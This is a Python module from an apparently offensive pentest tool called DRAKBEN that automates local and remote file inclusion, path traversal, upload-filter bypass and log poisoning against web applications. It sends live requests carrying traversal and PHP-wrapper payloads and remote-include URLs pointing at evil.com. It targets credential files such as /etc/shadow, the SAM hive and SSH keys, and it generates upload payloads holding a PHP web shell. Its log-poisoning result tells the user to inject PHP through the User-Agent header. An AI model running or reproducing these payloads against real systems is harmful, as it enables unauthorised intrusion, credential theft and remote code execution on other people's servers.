# modules/exploit/file_inclusion.py
"""
DRAKBEN File Inclusion Module — LFI, RFI, Path Traversal, File Upload.

Covers:
  - Local File Inclusion (LFI) — advanced
  - Remote File Inclusion (RFI)
  - Path Traversal (directory traversal)
  - File upload bypass techniques
  - Log poisoning for LFI-to-RCE
"""

import logging
import urllib.parse
from typing import Any

import aiohttp

logger = logging.getLogger(__name__)


# ═══════════════════════════════════════════════════════════
# LFI — Advanced Payloads & Wrappers
# ═══════════════════════════════════════════════════════════

# PHP wrapper payloads for LFI
_PHP_WRAPPER_PAYLOADS = [
    {"payload": "php://filter/convert.base64-encode/resource=index.php", "technique": "php_filter_b64"},
    {"payload": "php://filter/read=string.rot13/resource=index.php", "technique": "php_filter_rot13"},
    {"payload": "php://input", "technique": "php_input"},
    {"payload": "php://filter/convert.iconv.UTF-8.UTF-16/resource=index.php", "technique": "php_iconv"},
    {"payload": "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==", "technique": "data_wrapper"},
    {"payload": "expect://id", "technique": "expect_wrapper"},
    {"payload": "phar://test.phar", "technique": "phar_wrapper"},
]

# Advanced path traversal variants
_TRAVERSAL_PAYLOADS = [
    # Basic traversal
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc/passwd",
    "..%252f..%252f..%252fetc/passwd",
    # Null byte injection (PHP < 5.3)
    "../../../etc/passwd%00",
    "../../../etc/passwd\x00.jpg",
    # Windows paths
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "..%5c..%5c..%5cwindows/win.ini",
    # URL encoding bypass
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    # Dot truncation
    "../../../etc/passwd" + "." * 200,
]

# Sensitive file targets per OS
_SENSITIVE_FILES_LINUX = [
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/var/log/apache2/access.log",
    "/var/log/nginx/access.log",
    "/var/log/auth.log",
    "/home/*/.ssh/id_rsa",
    "/home/*/.bash_history",
    "/root/.bash_history",
]

_SENSITIVE_FILES_WINDOWS = [
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "C:\\Windows\\win.ini",
    "C:\\Windows\\System32\\config\\SAM",
    "C:\\inetpub\\logs\\LogFiles",
    "C:\\xampp\\apache\\logs\\access.log",
    "C:\\Users\\*\\.ssh\\id_rsa",
]

# File read success indicators
_FILE_INDICATORS: dict[str, list[str]] = {
    "/etc/passwd": ["root:", "bin/bash", "bin/sh", "nologin"],
    "/etc/shadow": ["$6$", "$5$", "$y$", "$1$"],
    "win.ini": ["[fonts]", "[extensions]", "[mci extensions]"],
    "hosts": ["127.0.0.1", "localhost"],
}


async def test_lfi_advanced(
    target_url: str,
    param: str,
    *,
    timeout: float = 10.0,
) -> dict[str, Any]:
    """Advanced LFI testing with PHP wrappers and encoding bypass.

    Args:
        target_url: Target URL with file inclusion parameter.
        param: Parameter name to test.
        timeout: HTTP request timeout.

    Returns:
        Dict with 'vulnerable', 'findings', 'techniques_tested'.

    """
    findings: list[dict[str, Any]] = []
    all_payloads = _TRAVERSAL_PAYLOADS + [p["payload"] for p in _PHP_WRAPPER_PAYLOADS]

    async with aiohttp.ClientSession(
        timeout=aiohttp.ClientTimeout(total=timeout),
        connector=aiohttp.TCPConnector(ssl=False),
    ) as session:
        for payload in all_payloads:
            encoded = urllib.parse.quote(payload, safe="")
            if "?" in target_url:
                url = f"{target_url}&{param}={encoded}"
            else:
                url = f"{target_url}?{param}={encoded}"

            try:
                async with session.get(url) as resp:
                    text = await resp.text()
                    indicator = _detect_file_content(text)
                    if indicator:
                        findings.append(
                            {
                                "payload": payload,
                                "indicator": indicator,
                                "status_code": resp.status,
                                "response_length": len(text),
                            }
                        )
                        logger.warning("LFI found with payload: %s", payload[:50])
            except (aiohttp.ClientError, TimeoutError, OSError):
                continue

    return {
        "vulnerable": len(findings) > 0,
        "findings": findings,
        "techniques_tested": len(all_payloads),
    }


# ═══════════════════════════════════════════════════════════
# RFI — Remote File Inclusion
# ═══════════════════════════════════════════════════════════

_RFI_PAYLOADS = [
    "http://evil.com/shell.txt",
    "https://evil.com/shell.txt",
    "//evil.com/shell.txt",
    "http://evil.com/shell.txt%00",
    "http://evil.com/shell.txt?",
    "data://text/plain;base64,PD9waHAgZWNobyAnUkZJX1RFU1QnOyA/Pg==",
]


async def test_rfi(
    target_url: str,
    param: str,
    *,
    canary: str = "RFI_CANARY_DRAKBEN",
    timeout: float = 10.0,
) -> dict[str, Any]:
    """Test for Remote File Inclusion vulnerability.

    Args:
        target_url: Target URL.
        param: Parameter name to test.
        canary: Canary string to detect inclusion.
        timeout: HTTP request timeout.

    Returns:
        Dict with 'vulnerable', 'findings'.

    """
    findings: list[dict[str, Any]] = []

    async with aiohttp.ClientSession(
        timeout=aiohttp.ClientTimeout(total=timeout),
        connector=aiohttp.TCPConnector(ssl=False),
    ) as session:
        for payload in _RFI_PAYLOADS:
            encoded = urllib.parse.quote(payload, safe="")
            if "?" in target_url:
                url = f"{target_url}&{param}={encoded}"
            else:
                url = f"{target_url}?{param}={encoded}"

            try:
                async with session.get(url) as resp:
                    text = await resp.text()
                    # Check for error messages that reveal inclusion attempt
                    if _detect_rfi_indicators(text):
                        findings.append(
                            {
                                "payload": payload,
                                "status_code": resp.status,
                                "indicator": "rfi_error_disclosure",
                            }
                        )
            except (aiohttp.ClientError, TimeoutError, OSError):
                continue

    return {
        "vulnerable": len(findings) > 0,
        "findings": findings,
    }


# ═══════════════════════════════════════════════════════════
# File Upload Bypass
# ═══════════════════════════════════════════════════════════

# File upload bypass techniques
FILE_UPLOAD_BYPASSES: list[dict[str, Any]] = [
    {
        "filename": "shell.php.jpg",
        "content_type": "image/jpeg",
        "technique": "double_extension",
    },
    {
        "filename": "shell.php%00.jpg",
        "content_type": "image/jpeg",
        "technique": "null_byte",
    },
    {
        "filename": "shell.pHp",
        "content_type": "application/x-php",
        "technique": "case_variation",
    },
    {
        "filename": "shell.php5",
        "content_type": "application/x-php",
        "technique": "alt_extension",
    },
    {
        "filename": "shell.phtml",
        "content_type": "application/x-php",
        "technique": "phtml_extension",
    },
    {
        "filename": ".htaccess",
        "content": "AddType application/x-httpd-php .jpg",
        "technique": "htaccess_override",
    },
    {
        "filename": "shell.jpg",
        "content_type": "image/jpeg",
        "technique": "magic_bytes",
        "prefix": b"\xff\xd8\xff\xe0",  # JPEG magic bytes
    },
    {
        "filename": "shell.php;.jpg",
        "content_type": "image/jpeg",
        "technique": "semicolon_bypass",
    },
]


def generate_upload_payloads() -> list[dict[str, Any]]:
    """Generate file upload bypass payloads.

    Returns:
        List of upload payload configurations.

    """
    payloads = []
    for bypass in FILE_UPLOAD_BYPASSES:
        payload = {
            "filename": bypass["filename"],
            "content_type": bypass.get("content_type", "application/octet-stream"),
            "technique": bypass["technique"],
            "web_shell_content": "<?php system($_GET['cmd']); ?>",
        }
        if "prefix" in bypass:
            payload["magic_prefix"] = bypass["prefix"].hex()
        payloads.append(payload)
    return payloads


# ═══════════════════════════════════════════════════════════
# Log Poisoning for LFI → RCE
# ═══════════════════════════════════════════════════════════

_LOG_FILES = [
    "/var/log/apache2/access.log",
    "/var/log/apache2/error.log",
    "/var/log/nginx/access.log",
    "/var/log/nginx/error.log",
    "/var/log/httpd/access_log",
    "/proc/self/environ",
    "/proc/self/fd/0",
    "/var/log/auth.log",
    "/var/log/mail.log",
]


async def test_log_poisoning(
    target_url: str,
    param: str,
    *,
    timeout: float = 10.0,
) -> dict[str, Any]:
    """Test for LFI-to-RCE via log poisoning.

    Attempts to include server log files that may contain injected code.

    Args:
        target_url: Target URL with LFI.
        param: LFI parameter name.
        timeout: Request timeout.

    Returns:
        Dict with 'accessible_logs', 'findings'.

    """
    accessible_logs: list[str] = []

    async with aiohttp.ClientSession(
        timeout=aiohttp.ClientTimeout(total=timeout),
        connector=aiohttp.TCPConnector(ssl=False),
    ) as session:
        for log_path in _LOG_FILES:
            traversal = "../../../.." + log_path
            encoded = urllib.parse.quote(traversal, safe="")
            if "?" in target_url:
                url = f"{target_url}&{param}={encoded}"
            else:
                url = f"{target_url}?{param}={encoded}"

            try:
                async with session.get(url) as resp:
                    text = await resp.text()
                    if _is_log_content(text):
                        accessible_logs.append(log_path)
                        logger.info("Accessible log file: %s", log_path)
            except (aiohttp.ClientError, TimeoutError, OSError):
                continue

    return {
        "accessible_logs": accessible_logs,
        "rce_potential": len(accessible_logs) > 0,
        "details": (
            f"Found {len(accessible_logs)} accessible log file(s). "
            "Inject PHP code via User-Agent header, then re-include."
            if accessible_logs
            else "No accessible log files found."
        ),
    }


# ═══════════════════════════════════════════════════════════
# Utility Functions
# ═══════════════════════════════════════════════════════════


def _detect_file_content(text: str) -> str | None:
    """Detect if response contains file content indicators."""
    for filename, indicators in _FILE_INDICATORS.items():
        for indicator in indicators:
            if indicator in text:
                return f"{filename}: {indicator}"
    return None


def _detect_rfi_indicators(text: str) -> bool:
    """Detect RFI-related error messages in response."""
    indicators = [
        "include(",
        "require(",
        "file_get_contents(",
        "fopen(",
        "failed to open stream",
        "No such file",
        "URL file-access is disabled",
        "allow_url_include",
    ]
    text_lower = text.lower()
    return any(ind.lower() in text_lower for ind in indicators)


def _is_log_content(text: str) -> bool:
    """Detect if response looks like log file content."""
    log_patterns = [
        "GET /",
        "POST /",
        "HTTP/1.",
        "Mozilla/5.0",
        "[error]",
        "[notice]",
    ]
    matches = sum(1 for p in log_patterns if p in text)
    return matches >= 2
